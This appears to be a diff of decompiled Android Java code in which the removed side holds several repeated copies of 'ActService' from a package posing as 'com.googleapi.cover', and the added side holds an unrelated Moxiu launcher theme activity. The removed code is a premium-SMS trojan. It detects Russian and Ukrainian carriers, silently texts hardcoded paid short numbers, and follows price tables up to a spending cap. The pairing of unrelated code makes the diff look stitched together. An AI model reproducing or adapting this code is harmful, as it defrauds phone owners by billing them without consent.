@@ -1,2461 +1,513 @@
-Package Path:com.googleapi.cover.ActService.Worker
-Class Name:ActService
-Content: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp.onCreate
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
 
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        setContentView(R.layout.main);
+        if (isInstalled()) {
+            if (this.ver < 311) {
+                this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_version_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.1
+                    @Override // android.content.DialogInterface.OnClickListener
+                    public void onClick(DialogInterface dialogInterface, int i) {
+                        carbqagp.this.installMoXiuLauncherApk();
+                        dialogInterface.dismiss();
+                    }
+                }).create();
+                this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.2
+                    @Override // android.content.DialogInterface.OnKeyListener
+                    public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                        if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                            carbqagp.this.finish();
+                            carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                            return false;
+                        }
+                        return false;
+                    }
+                });
+                this.interDialog.show();
                 return;
             }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-
-Package Path:com.googleapi.cover.ActService.Worker
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-
-Package Path:com.googleapi.cover.ActService.ActService
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-public class ActService extends Service {
-    private static final double MF_LIMIT = 350.0d;
-    private static final double MTS_LIMIT = 350.0d;
-    private static String PREF_TO_USE;
-    private static boolean isStarted;
-    private PowerManager.WakeLock wakeLock;
-    public static String NUM_10 = "9865";
-    public static String NUM_5 = "9864";
-    public static String NUM_3 = "9863";
-    public static String NUM_1 = "1627";
-    public static String PREF_PLAT = "6563352";
-    public static String PREF_A1 = "7987035";
-    public static String NUM_5_A1 = "7781";
-    public static String NUM_3_A1 = "1161";
-    public static String NUM_2_A1 = "1899";
-    public static String NUM_1_A1 = "1151";
-    public static String NUM_1_ALT_A1 = "1141";
-    public static String NUM_5_SD = "8612";
-    public static String NUM_4_SD = "8611";
-    public static String NUM_3_SD = "8610";
-    public static String NUM_2_SD = "8609";
-    public static String NUM_1_SD = "8608";
-    public static String NUM_1_ALT_SD = "8607";
-    public static String NUM_1_ALT_2_SD = "8606";
-    private static ArrayList<Pair<String, Double>> mfPrices = new ArrayList<>();
-    private static ArrayList<Pair<String, Double>> mtsPrices = new ArrayList<>();
-
-    static {
-        mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)));
-        mfPrices.add(new Pair<>(NUM_4_SD, Double.valueOf(135.0d)));
-        mfPrices.add(new Pair<>(NUM_3_SD, Double.valueOf(100.0d)));
-        mfPrices.add(new Pair<>(NUM_2_SD, Double.valueOf(42.0d)));
-        mfPrices.add(new Pair<>(NUM_1_SD, Double.valueOf(30.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_SD, Double.valueOf(17.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_2_SD, Double.valueOf(3.39d)));
-        mtsPrices.add(new Pair<>(NUM_5_A1, Double.valueOf(203.2d)));
-        mtsPrices.add(new Pair<>(NUM_3_A1, Double.valueOf(111.76d)));
-        mtsPrices.add(new Pair<>(NUM_2_A1, Double.valueOf(74.51d)));
-        mtsPrices.add(new Pair<>(NUM_1_A1, Double.valueOf(42.34d)));
-        mtsPrices.add(new Pair<>(NUM_1_ALT_A1, Double.valueOf(27.09d)));
-    }
-
-    @Override // android.app.Service
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override // android.app.Service
-    public void onCreate() {
-        isStarted = false;
-        super.onCreate();
-    }
-
-    @Override // android.app.Service
-    public void onDestroy() {
-        super.onDestroy();
-        this.wakeLock.release();
-    }
-
-    @Override // android.app.Service, android.content.ComponentCallbacks
-    public void onLowMemory() {
-        super.onLowMemory();
-    }
-
-    @Override // android.app.Service
-    public void onStart(Intent intent, int startId) {
-        super.onStart(intent, startId);
-    }
-
-    @Override // android.app.Service
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!isStarted) {
-            Worker worker = new Worker(this, null);
-            worker.start();
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
